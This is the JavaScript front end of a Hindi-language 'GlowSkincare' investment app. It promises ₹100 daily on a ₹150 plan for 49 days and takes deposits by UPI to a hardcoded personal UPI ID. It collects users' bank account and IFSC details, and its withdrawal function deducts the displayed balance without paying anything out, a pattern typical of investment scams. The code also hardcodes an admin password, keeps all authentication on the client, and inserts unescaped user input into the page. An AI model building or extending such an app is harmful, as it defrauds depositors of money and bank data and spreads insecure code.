const MY_UPI_ID = "gyanshu@paytm";
const ADMIN_PASS = "admin786";

function getStorage(key, defaultVal) {
  return JSON.parse(localStorage.getItem(key) || JSON.stringify(defaultVal));
}
function setStorage(key, val) {
  localStorage.setItem(key, JSON.stringify(val));
}

let currentSession = localStorage.getItem('glow_session') || null;
let currentTab = 'home';
let isAdmin = false;
let isReg = false;

function render() {
  const app = document.getElementById('app');
  app.innerHTML = '';

  if (isAdmin) {
    app.innerHTML = renderAdmin();
    return;
  }

  if (!currentSession) {
    app.innerHTML = renderAuth();
    return;
  }

  const users = getStorage('glow_users', {});
  const user = users[currentSession];
  if (!user) {
    currentSession = null;
    localStorage.removeItem('glow_session');
    render();
    return;
  }

  app.innerHTML = `
    <div class="pb-20 overflow-y-auto flex-1">
      ${renderTabContent(currentTab, user)}
    </div>
    <div class="absolute bottom-0 left-0 right-0 bg-gray-900 border-t border-gray-800 flex justify-around py-3 z-20">
      <button onclick="switchTab('home')" class="flex flex-col items-center ${currentTab==='home'?'text-emerald-400':'text-gray-400'} text-[11px]">🏠<span>Home</span></button>
      <button onclick="switchTab('invest')" class="flex flex-col items-center ${currentTab==='invest'?'text-emerald-400':'text-gray-400'} text-[11px]">💎<span>Invest</span></button>
      <button onclick="switchTab('profile')" class="flex flex-col items-center ${currentTab==='profile'?'text-emerald-400':'text-gray-400'} text-[11px]">👤<span>Account</span></button>
    </div>
  `;
}

function switchTab(tab) {
  currentTab = tab;
  render();
}

function setAuthMode(regStatus) {
  isReg = regStatus;
  render();
}

function renderAuth() {
  return `
    <div class="min-h-screen flex flex-col justify-center items-center p-6">
      <div class="w-full bg-gray-900 rounded-3xl p-6 border border-gray-800 shadow-xl">
        <h1 class="text-2xl font-black text-emerald-400 text-center mb-6">✨ GlowSkincare ✨</h1>
        <div class="flex bg-gray-950 p-1 rounded-2xl mb-6 border border-gray-800">
          <button onclick="setAuthMode(false)" class="flex-1 py-2 text-xs font-bold rounded-xl ${!isReg?'bg-emerald-600 text-white':'text-gray-400'}">लॉगिन</button>
          <button onclick="setAuthMode(true)" class="flex-1 py-2 text-xs font-bold rounded-xl ${isReg?'bg-emerald-600 text-white':'text-gray-400'}">रजिस्टर</button>
        </div>
        <form onsubmit="handleAuthSubmit(event)" class="space-y-3">
          <input type="text" id="phone" placeholder="मोबाइल नंबर" required class="w-full px-4 py-3 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white">
          ${isReg ? `
            <input type="text" id="username" placeholder="यूजरनेम" required class="w-full px-4 py-3 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white">
            <input type="password" id="withdrawPass" placeholder="विथड्रॉल पासवर्ड (अलग)" required class="w-full px-4 py-3 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white">
            <input type="text" id="inviteCode" placeholder="इनविटेशन कोड (वैकल्पिक)" class="w-full px-4 py-3 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white">
          ` : ''}
          <input type="password" id="loginPass" placeholder="लॉगिन पासवर्ड" required class="w-full px-4 py-3 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white">
          <button type="submit" class="w-full py-3 bg-emerald-600 text-white font-bold rounded-xl text-xs mt-2">${isReg ? 'अकाउंट बनाएं' : 'लॉगिन करें'}</button>
        </form>
      </div>
    </div>
  `;
}

function handleAuthSubmit(e) {
  e.preventDefault();
  const phone = document.getElementById('phone').value.trim();
  const loginPass = document.getElementById('loginPass').value.trim();

  if (phone === "admin" && loginPass === ADMIN_PASS) {
    isAdmin = true;
    render();
    return;
  }

  const users = getStorage('glow_users', {});

  if (isReg) {
    const username = document.getElementById('username').value.trim();
    const withdrawPass = document.getElementById('withdrawPass').value.trim();
    const inviteCodeInput = document.getElementById('inviteCode').value.trim();

    if (users[phone]) {
      alert('यह नंबर पहले से रजिस्टर्ड है! कृपया लॉगिन करें।');
      return;
    }

    users[phone] = {
      phone,
      username,
      loginPass,
      withdrawPass,
      inviteCode: Math.random().toString(36).substring(2, 8).toUpperCase(),
      rechargeWallet: 0,
      withdrawWallet: 0,
      productIncome: 0,
      vipLevel: 0,
      spinChances: 1,
      bankLocked: false,
      bankDetails: null,
      myPlans: [],
      withdrawHistory: []
    };

    setStorage('glow_users', users);
    currentSession = phone;
    localStorage.setItem('glow_session', phone);
    alert('रजिस्ट्रेशन सफल रहा!');
    render();
  } else {
    if (!users[phone] || users[phone].loginPass !== loginPass) {
      alert('गलत मोबाइल नंबर या पासवर्ड!');
      return;
    }
    currentSession = phone;
    localStorage.setItem('glow_session', phone);
    render();
  }
}

function renderTabContent(tab, user) {
  if (tab === 'home') {
    return `
      <div class="bg-gradient-to-b from-emerald-950 to-gray-900 p-4 border-b border-gray-800">
        <div class="flex justify-between items-center mb-3">
          <div class="flex items-center gap-2">
            <div class="w-9 h-9 rounded-full bg-emerald-500 text-black font-black flex items-center justify-center">${user.username.slice(0,2).toUpperCase()}</div>
            <div><h4 class="font-bold text-xs text-white">${user.username}</h4><p class="text-[10px] text-emerald-400">ID: ${user.phone}</p></div>
          </div>
          <button onclick="logout()" class="text-xs bg-red-600/20 text-red-400 px-2.5 py-1 rounded-lg">लॉग आउट</button>
        </div>
        <div class="grid grid-cols-3 gap-2 bg-gray-950 p-3 rounded-xl text-center border border-gray-800">
          <div><h4 class="text-xs font-bold text-emerald-400">₹${user.productIncome.toFixed(2)}</h4><p class="text-[9px] text-gray-400">Income</p></div>
          <div class="border-x border-gray-800"><h4 class="text-xs font-bold text-emerald-400">₹${user.rechargeWallet.toFixed(2)}</h4><p class="text-[9px] text-gray-400">Recharge</p></div>
          <div><h4 class="text-xs font-bold text-emerald-400">₹${user.withdrawWallet.toFixed(2)}</h4><p class="text-[9px] text-gray-400">Withdraw</p></div>
        </div>
      </div>
      <div class="p-4 space-y-3">
        <div class="grid grid-cols-4 gap-2 text-center">
          <button onclick="switchTab('recharge')" class="bg-gray-900 p-3 rounded-xl border border-gray-800"><span class="text-lg">💳</span><p class="text-[10px] text-gray-300">Recharge</p></button>
          <button onclick="switchTab('withdraw')" class="bg-gray-900 p-3 rounded-xl border border-gray-800"><span class="text-lg">🏦</span><p class="text-[10px] text-gray-300">Withdraw</p></button>
          <button onclick="switchTab('myPlans')" class="bg-gray-900 p-3 rounded-xl border border-gray-800"><span class="text-lg">📄</span><p class="text-[10px] text-gray-300">Orders</p></button>
          <button onclick="switchTab('profile')" class="bg-gray-900 p-3 rounded-xl border border-gray-800"><span class="text-lg">⚙️</span><p class="text-[10px] text-gray-300">Settings</p></button>
        </div>
        <div onclick="switchTab('spin')" class="bg-gradient-to-r from-amber-600 to-orange-600 p-4 rounded-xl text-white cursor-pointer flex justify-between items-center">
          <div><h3 class="font-bold text-xs">Lucky Spin Wheel</h3><p class="text-[10px]">चांस बचे हैं: ${user.spinChances}</p></div>
          <span>🎯</span>
        </div>
      </div>
    `;
  }
  if (tab === 'invest') {
    return `
      <div class="p-4 space-y-3">
        <h3 class="font-bold text-xs text-white">इन्वेस्टमेंट प्लान</h3>
        <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 space-y-2">
          <h4 class="font-bold text-emerald-400 text-xs">Daily Skincare Starter Plan</h4>
          <p class="text-[11px] text-gray-300">मूल्य: ₹150 | दैनिक आय: ₹100 | अवधि: 49 दिन</p>
          <button onclick="buyPlan()" class="w-full py-2.5 bg-emerald-600 text-white font-bold rounded-xl text-xs">प्लान खरीदें (₹150)</button>
        </div>
      </div>
    `;
  }
  if (tab === 'recharge') {
    return `
      <div class="p-4 space-y-3">
        <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 space-y-3">
          <h3 class="font-bold text-xs text-white">रिचार्ज (न्यूनतम ₹150)</h3>
          <p class="text-[10px] text-gray-400">UPI ID: ${MY_UPI_ID} पर पेमेंट करके UTR और स्क्रीनशॉट अपलोड करें।</p>
          <form onsubmit="handleRecharge(event)" class="space-y-3">
            <input type="number" id="recAmt" min="150" placeholder="राशि (₹)" required class="w-full p-2.5 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white">
            <input type="text" id="recUtr" placeholder="12 अंकों की UTR आईडी" required class="w-full p-2.5 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white">
            <input type="file" id="recImg" accept="image/*" required class="w-full text-xs text-gray-400">
            <button type="submit" class="w-full py-2.5 bg-emerald-600 text-white rounded-xl text-xs font-bold">रिचार्ज सबमिट करें</button>
          </form>
        </div>
      </div>
    `;
  }
  if (tab === 'withdraw') {
    return `
      <div class="p-4 space-y-3">
        <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 space-y-3">
          <h3 class="font-bold text-xs text-white">विथड्रॉल (न्यूनतम ₹200)</h3>
          <p class="text-[10px] text-gray-400">बैलेंस: ₹${user.withdrawWallet.toFixed(2)} (दिन में अधिकतम 2 बार)</p>
          <form onsubmit="handleWithdraw(event)" class="space-y-3">
            <input type="number" id="withAmt" min="200" placeholder="राशि (₹)" required class="w-full p-2.5 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white">
            <input type="password" id="withPass" placeholder="विथड्रॉल पासवर्ड" required class="w-full p-2.5 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white">
            <button type="submit" class="w-full py-2.5 bg-emerald-600 text-white rounded-xl text-xs font-bold">विथड्रॉल करें</button>
          </form>
        </div>
      </div>
    `;
  }
  if (tab === 'profile') {
    return `
      <div class="p-4 space-y-3">
        <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 space-y-3">
          <h3 class="font-bold text-xs text-white">बैंक विवरण</h3>
          ${user.bankLocked ? `
            <div class="text-xs text-emerald-300"><p>नाम: ${user.bankDetails.name}</p><p>अकाउंट: ${user.bankDetails.accNo}</p><p>IFSC:${user.bankDetails.ifsc}</p></div>
          ` : `
            <form onsubmit="saveBank(event)" class="space-y-2">
              <input type="text" id="bName" placeholder="धारक का नाम" required class="w-full p-2 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white">
              <input type="text" id="bAcc" placeholder="अकाउंट नंबर" required class="w-full p-2 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white">
              <input type="text" id="bIfsc" placeholder="IFSC कोड" required class="w-full p-2 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white">
              <button type="submit" class="w-full py-2 bg-emerald-600 text-white rounded-xl text-xs">बैंक सेव करें</button>
            </form>
          `}
        </div>
      </div>
    `;
  }
  if (tab === 'spin') {
    return `
      <div class="p-4 space-y-3 text-center">
        <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 space-y-3">
          <h3 class="font-bold text-xs text-white">🎡 लकी स्पिन</h3>
          <p class="text-[10px] text-gray-400">चांस बचे हैं: ${user.spinChances}</p>
          <button onclick="spinWheel()" class="w-full py-2.5 bg-emerald-600 text-white rounded-xl text-xs font-bold">स्पिन घुमाएं</button>
        </div>
      </div>
    `;
  }
  return `<div class="p-4 text-xs text-gray-400">जल्द आ रहा है...</div>`;
}

function buyPlan() {
  const users = getStorage('glow_users', {});
  const user = users[currentSession];
  if (user.rechargeWallet < 150) {
    alert('रिचार्ज वॉलेट में पर्याप्त बैलेंस नहीं है!');
    switchTab('recharge');
    return;
  }
  user.rechargeWallet -= 150;
  user.spinChances += 1;
  user.myPlans.push({ id: Date.now(), name: 'Daily Skincare Starter Plan', price: 150, date: Date.now() });
  setStorage('glow_users', users);
  alert('प्लान सफलतापूर्वक खरीद लिया गया है!');
  render();
}

function handleRecharge(e) {
  e.preventDefault();
  const amt = parseFloat(document.getElementById('recAmt').value);
  const utr = document.getElementById('recUtr').value.trim();
  const fileInput = document.getElementById('recImg');
  
  if (amt < 150) {
    alert('न्यूनतम रिचार्ज ₹150 है!');
    return;
  }

  const reader = new FileReader();
  reader.onload = function(event) {
    const pending = getStorage('glow_pending', []);
    pending.push({ id: Date.now(), phone: currentSession, amount: amt, utr, img: event.target.result });
    setStorage('glow_pending', pending);
    alert('रिचार्ज अनुरोध भेज दिया गया है!');
    switchTab('home');
  };
  reader.readAsDataURL(fileInput.files[0]);
}

function handleWithdraw(e) {
  e.preventDefault();
  const users = getStorage('glow_users', {});
  const user = users[currentSession];
  const amt = parseFloat(document.getElementById('withAmt').value);
  const pass = document.getElementById('withPass').value.trim();

  if (!user.bankLocked) {
    alert('पहले बैंक डिटेल्स सेव करें!');
    switchTab('profile');
    return;
  }
  if (pass !== user.withdrawPass) {
    alert('गलत विथड्रॉल पासवर्ड!');
    return;
  }
  if (amt < 200 || amt > user.withdrawWallet) {
    alert('अमान्य राशि या अपर्याप्त बैलेंस!');
    return;
  }

  user.withdrawWallet -= amt;
  setStorage('glow_users', users);
  alert('विथड्रॉल अनुरोध सफल रहा!');
  render();
}

function saveBank(e) {
  e.preventDefault();
  const users = getStorage('glow_users', {});
  const user = users[currentSession];
  user.bankDetails = {
    name: document.getElementById('bName').value.trim(),
    accNo: document.getElementById('bAcc').value.trim(),
    ifsc: document.getElementById('bIfsc').value.trim()
  };
  user.bankLocked = true;
  setStorage('glow_users', users);
  alert('बैंक विवरण सेव हो गए!');
  render();
}

function spinWheel() {
  const users = getStorage('glow_users', {});
  const user = users[currentSession];
  if (user.spinChances <= 0) {
    alert('कोई स्पिन चांस नहीं बचा है!');
    return;
  }
  user.spinChances -= 1;
  const rewards = [0, 10, 20, 50, 100];
  const won = rewards[Math.floor(Math.random() * rewards.length)];
  user.withdrawWallet += won;
  setStorage('glow_users', users);
  alert(won > 0 ? `बधाई हो! आपने ₹${won} जीते हैं!` : 'इस बार कुछ नहीं निकला!');
  render();
}

function logout() {
  currentSession = null;
  localStorage.removeItem('glow_session');
  render();
}

function renderAdmin() {
  const pending = getStorage('glow_pending', []);
  return `
    <div class="p-4 space-y-4 text-xs text-white">
      <div class="flex justify-between items-center bg-gray-900 p-3 rounded-xl border border-gray-800">
        <h1 class="font-bold text-emerald-400">🛡️ Admin Panel</h1>
        <button onclick="isAdmin=false;render()" class="bg-emerald-600 px-3 py-1 rounded-lg">बाहर निकलें</button>
      </div>
      <h3 class="font-bold">पेंडिंग रिचार्ज (${pending.length})</h3>
      ${pending.map(p => `
        <div class="bg-gray-900 p-3 rounded-xl border border-gray-800 space-y-2">
          <p>मोबाइल: ${p.phone} \vert{} राशि: ₹${p.amount}</p>
          <p class="text-yellow-400 font-mono">UTR: ${p.utr}</p>
          <img src="${p.img}" class="w-20 h-20 object-cover rounded">
          <button onclick="approveRecharge(${p.id})" class="w-full py-1.5 bg-emerald-600 rounded-lg font-bold">Approve</button>
        </div>
      `).join('')}
    </div>
  `;
}

function approveRecharge(id) {
  // कन्फर्मेशन पॉप-अप
  const isConfirmed = confirm("क्या आप वाकई इस रिचार्ज को अप्रूव करना चाहते हैं?");
  if (!isConfirmed) {
    return; // अगर Cancel कर दिया, तो कुछ नहीं होगा
  }

  let pending = getStorage('glow_pending', []);
  const req = pending.find(p => p.id === id);
  if (!req) return;

  const users = getStorage('glow_users', {});
  if (users[req.phone]) {
    users[req.phone].rechargeWallet += req.amount;
    setStorage('glow_users', users);
  }

  pending = pending.filter(p => p.id !== id);
  setStorage('glow_pending', pending);
  alert('रिचार्ज सफलतापूर्वक अप्रूव कर दिया गया है!');
  render();
}

render();
      
